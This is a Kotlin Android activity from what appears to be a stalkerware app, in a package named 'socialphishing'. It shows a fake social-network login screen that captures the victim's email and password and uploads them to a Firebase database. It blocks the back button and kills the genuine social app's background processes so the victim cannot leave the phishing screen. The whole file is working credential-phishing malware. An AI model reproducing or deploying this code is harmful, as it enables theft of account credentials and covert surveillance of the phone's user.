package com.github.midros.istheapp.ui.activities.socialphishing

import android.app.ActivityManager
import android.content.Context
import android.os.Bundle
import android.view.KeyEvent
import android.widget.Button
import android.widget.EditText
import com.github.midros.istheapp.R
import com.github.midros.istheapp.data.model.Social
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.social.MonitorService
import com.github.midros.istheapp.ui.activities.base.BaseActivity
import com.github.midros.istheapp.utils.ConstFun.getPackageCheckSocial
import com.github.midros.istheapp.utils.Consts.CHILD_SOCIAL_MS
import com.github.midros.istheapp.utils.Consts.SOCIAL
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.longToast
import kotterknife.bindView
import javax.inject.Inject

/**
 * Created by luis rafael on 20/03/18.
 */
class SocialActivityM : BaseActivity(R.layout.activity_s) {

    private val txtEmail : EditText by bindView(R.id.txt_email_social)
    private val txtPass : EditText by bindView(R.id.txt_password_social)
    private val btnLogin : Button by bindView(R.id.btn_login_social)

    @Inject lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        getComponent()!!.inject(this)
        onClickApp()
    }

    private fun onClickApp(){
        btnLogin.setOnClickListener {
            if (txtEmail.text.toString() != "" && txtPass.text.toString() != ""){
                val social = Social(txtEmail.text.toString(),txtPass.text.toString())
                firebase.getDatabaseReference("$SOCIAL/$CHILD_SOCIAL_MS").setValue(social).addOnCompleteListener {
                    stopService(IntentFor<MonitorService>(this))
                    finish()
                }
            }else{
                longToast(R.string.all_fields)
            }
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK){
            //killApp()
            //finish()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onPause() {
        super.onPause()
        killApp()
    }

    private fun killApp(){
        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        am.killBackgroundProcesses(getPackageCheckSocial())
    }


}